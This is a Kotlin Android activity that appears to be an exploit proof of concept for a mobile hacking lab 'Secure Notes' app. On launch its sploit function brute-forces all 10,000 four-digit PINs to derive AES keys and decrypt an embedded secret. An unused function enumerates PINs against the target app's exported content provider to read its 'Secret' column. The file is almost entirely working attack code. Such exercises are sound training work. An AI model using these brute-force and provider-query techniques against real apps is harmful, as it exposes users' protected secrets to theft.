package com.mhl.securenotes

import android.os.Bundle
import android.util.Base64
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import androidx.core.net.toUri
import com.mhl.securenotes.ui.theme.SecurenotespocTheme
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec
import kotlin.text.Charsets.UTF_8

class MainActivity : ComponentActivity() {

    private val encryptedSecret: ByteArray? = Base64.decode("<encryptedSecret>", Base64.DEFAULT)
    private val salt: ByteArray? = Base64.decode("<salt>", Base64.DEFAULT)
    private val iv: ByteArray? = Base64.decode("<iv>", Base64.DEFAULT)
    private val iterationCount: Int = 10000

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            SecurenotespocTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Text(text = "Secure Notes PoC")
                }
            }
        }

        sploit()
    }

    fun sploit() {
        for (i in 0..9999) {
            try {
                val pin = String.format(Locale.US, "%04d", i)
                val secret = decryptSecret(pin)
                if (secret != null) {
                    println("Valid PIN: $pin, Secret : $secret")
                }
            } catch (_: Exception) {
            }
        }

        // readContentProvider()
    }

    @Suppress("unused")
    fun readContentProvider() {
        val contentUri = "content://com.mobilehackinglab.securenotes.secretprovider".toUri()

        for (i in 0..9999) {
            val selection = String.format(Locale.US, "pin=%04d", i)
            val cursor = contentResolver.query(contentUri, null, selection, null, null)

            cursor?.use { c ->
                while (c.moveToNext()) {
                    val idx = c.getColumnIndex("Secret")
                    if (idx != -1) {
                        val ret = c.getString(idx)
                        println("PIN : $i, Secret: $ret")
                    }
                }
            }
        }
    }

    private fun decryptSecret(pin: String): String? {
        return try {
            val cipher: Cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            val secretKeySpec = SecretKeySpec(generateKeyFromPin(pin), "AES")
            val bArr: ByteArray? = this.iv

            val ivParameterSpec = IvParameterSpec(bArr)
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec)
            val bArr2: ByteArray? = this.encryptedSecret

            val decryptedBytes: ByteArray = cipher.doFinal(bArr2)

            String(decryptedBytes, UTF_8)
        } catch (_: Exception) {
            null
        }
    }

    private fun generateKeyFromPin(pin: String): ByteArray {
        val charArray = pin.toCharArray()
        val bArr: ByteArray? = this.salt

        val keySpec = PBEKeySpec(charArray, bArr, this.iterationCount, 256)
        val keyFactory: SecretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1")

        return keyFactory.generateSecret(keySpec).encoded
    }
}
